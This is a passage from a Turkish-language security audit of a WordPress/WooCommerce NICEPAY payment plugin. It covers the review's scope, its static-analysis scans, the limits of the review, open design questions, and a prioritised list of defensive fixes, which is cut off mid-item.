İNCELENENLER (tam okuma, dosyanın nihai hali + PR diff'i): 13 üretim PHP sınıfı/dosyası (`nicepay-payment-gateway.php` 827 satır, `includes/nicepay-functions.php` 1956, `includes/class-nicepay-gateway.php` 919, `includes/class-nicepay-api.php` 739, `includes/class-nicepay-inbound-validator.php`, `class-nicepay-installer.php`, `class-nicepay-transaction-schema.php`, `class-nicepay-offer-resolver.php`, `class-nicepay-retention.php`, `class-nicepay-privacy.php`, `class-nicepay-return-handler.php`, `class-nicepay-blocks-integration.php`, `nicepay-icons.php`), 2 admin dosyası (`class-nicepay-admin.php` 1199, `class-nicepay-transactions.php` 1030), 2 şablon, 4 JS asset'inin tamamı (`nicepay.js` 499, `nicepay-admin.js` 380, `nicepay-shortcode-admin.js` 312, `nicepay-blocks.js` 51), `SECURITY.md`, `readme.txt`, `composer.json`, `.gitattributes`, `.gitignore`, `build-release.sh`, 3 GitHub workflow'unun izin/pin yapısı, `tests/unit/NicePayRateLimitTest.php`, `tests/bootstrap/*` ve `tests/integration/schema-migration.php` başlıkları.

SİSTEMATİK TARAMALAR: (1) tüm `$wpdb->*` çağrılarının (60 adet) prepare/allowlist denetimi; (2) `echo`/`printf` çıktılarının kaçış denetimi — kaçışsız 16 eşleşmenin tamamı sabit ternary veya hardcoded SVG allowlist'i çıktı; (3) tüm `current_user_can`/`wp_verify_nonce`/`check_admin_referer`/`wp_create_nonce` çağrılarının yetki-nonce matrisi; (4) `$_GET`/`$_POST`/`$_SERVER`/`$_REQUEST`/`$_COOKIE`/`$_FILES` kullanımlarının tamamı; (5) `unserialize`/`eval`/`extract`/`shell_exec` (sıfır bulgu); (6) tüm PHP dosyalarında ABSPATH guard'ı (eksiksiz); (7) JS'te `innerHTML`/`.html()`/`insertAdjacentHTML`/`postMessage`/`location.hash` (sıfır bulgu); (8) `wp_redirect` vs `wp_safe_redirect`; (9) dinamik çeviri çağrıları.

İNCELENEMEYENLER / SINIRLAR: `docs/analysis/*` (14 dosya, ~14.700 satır) yalnızca 14-remediation-progress.md üzerinden kod-doküman uyumu için tarandı, satır satır okunmadı — bunlar kod değil, önceki analiz raporlarıdır. Dil dosyaları (`.po`/`.mo`/`.pot`, ~9.000 satır diff) i18n boyutunun konusu olduğu için içerik olarak incelenmedi; yalnız `check-po-placeholders.js`'in CI'da olduğu doğrulandı. `deploy-wordpress-org.yml`'nin 311 satırı tamamen değil, yalnız `permissions`/`secrets`/`uses` satırları üzerinden denetlendi. Unit testlerin çoğu (20 dosya) okunmadı — testlerin *içeriği* değil, üretim kodunun davranışı esas alındı. Çalıştırılamayanlar: PHP yorumlayıcısı bu ortamda mevcut değildi, dolayısıyla `php -l` ile sözdizimi doğrulaması ve PHPUnit koşusu yapılamadı; gerçek bir WordPress/WooCommerce kurulumu olmadığı için bulguların hiçbiri canlı ortamda sömürü ile doğrulanmadı — tüm bulgular statik kod okumasına dayanıyor ve her biri satır referanslı alıntı taşıyor.

**Açık sorular**

- SEC-001 için: test modunun canlı bir ödeme yüzeyinde kalması bilinçli bir ürün kararı mı, yoksa `is_available()` içinde bir mode kapısı unutuldu mu? `docs/analysis/14-remediation-progress.md:56` R08 paketini `DÜZELTİLDİ` ilan edip 'readiness/test-live uyarıları' diyor — uyarı var ama kapı yok; kabul ölçütü uyarıyla mı sınırlıydı?
- SEC-003 için: `nicepay_manage_transactions_capability` filtresinin hem okuma hem para iadesi yetkisini aynı anda kontrol etmesi tasarım tercihi mi? Eğer öyleyse filtre dokümantasyonunda (`docs/DEVELOPER-GUIDE.md`) 'bu filtre gerçek para hareketi yetkisini de değiştirir' uyarısı var mı — kontrol edilmedi.
- SEC-002 için: `ajax_refresh_payment_nonce` uç noktası hangi somut cache senaryosu için eklendi? Eğer amaç sayfa cache'i ise, formu `wp_cache` dışı bırakmak veya nonce'u tamamen kaldırıp yalnız rate-limit + offer doğrulamasına güvenmek daha az saldırı yüzeyi bırakır mı?
- NICEPAY'in `ReqReserved` alanının auth dönüşünde echo edilip edilmediğine dair sağlayıcı fixture'ı ne zaman bekleniyor? SEC-004'ün kesin kapanışı ve şemadaki kullanılmayan `binding_token_hash` sütununun devreye girmesi buna bağlı.
- Standalone akışında alıcı PII'sinin (SEC-005) merchant tarafından ön-doldurulması gerçek bir kullanım senaryosuna mı dayanıyor? Eğer yalnız 'tek kişilik ödeme linki' senaryosu içinse, bu özelliği kaldırıp yerine kısa ömürlü kişiye özel ödeme linki üretmek hem gizlilik hem UX açısından daha iyi olabilir.

## Konum doğrulama durumu

Bulgu konumları dosya varlığı ve satır aralığı için otomatik kontrol edildi.

| Durum | Adet |
|---|---|
| ok | 23 |

## Öncelikli aksiyon listesi

1. **SEC-011** — Ters çevirme bağlamını asla istekten kurma; claim'den sonra kalıcılaştırılmış satırdan kur. Somut olarak: (a) request_net_cancel'a transaction satırını da geçir ve gönderimden önce `hash_equals( (string) $transaction->tid, (string) $auth_data['TxTid'] )` doğrula, aksi halde WP_Error ile fail-closed dön; (b) claim'den ÖNCE gelen TxTid'in ledger'da başka bir satırda kayıtlı olup olmadığını sorgula (
2. **SEC-012** — Her ödeme denemesi için sunucu tarafında rastgele bir bağlama nonce'u üret, SHA-256 özetini binding_token_hash sütununa yaz ve düz halini ReqReserved (WooCommerce) / MallReserved alanıyla NICEPAY penceresine gönder. Dönüşte `hash_equals( $transaction->binding_token_hash, hash( 'sha256', $payload['ReqReserved'] ) )` doğrulaması yapılmadan hiçbir claim alınmasın. Ayrıca: (a) gelen TxTid ledger'da za
3. **SEC-013** — (1) set_default_options() içinde nicepay_test_mid/nicepay_test_merchant_key'i BOŞ bırak; API sekmesine 'NICEPAY genel sandbox kimliklerini yükle' butonu ekle (açık kullanıcı eylemi). (2) is_available() ve render_payment_shortcode()'a mod kapısı ekle: test modunda yalnızca `'yes' === get_option( 'nicepay_test_mode_acknowledged' )` ise ödeme aç; bu option ayrı bir onay kutusuyla ve uyarı metniyle al
